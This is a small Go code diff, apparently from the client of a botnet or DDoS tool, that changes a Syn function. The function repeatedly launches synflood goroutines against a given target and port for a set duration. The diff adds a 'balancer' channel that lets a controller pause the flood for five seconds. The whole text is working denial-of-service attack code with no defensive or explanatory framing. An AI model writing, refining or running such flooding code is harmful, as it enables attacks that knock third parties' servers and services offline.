@@ -2,6 +2,7 @@ package methods
 
 import (
 	"fmt"
+	"homo/client/balancer"
 	"net"
 	"strconv"
 	"strings"
@@ -22,10 +23,17 @@ func Syn(target string, port string, duration string) {
 	sec := time.Now().Unix()
 	for time.Now().Unix() <= sec+int64(dur)-1 {
 
-		go synflood(target, port)
-		time.Sleep(200 * time.Millisecond)
-		go synflood(target, port)
-		go synflood(target, port)
+		select {
+		case <-balancer.BalanceCh:
+			fmt.Println("Balancer")
+			time.Sleep(5 * time.Second)
+		default:
+
+			go synflood(target, port)
+			time.Sleep(200 * time.Millisecond)
+			go synflood(target, port)
+			go synflood(target, port)
+		}
 	}
 }
 
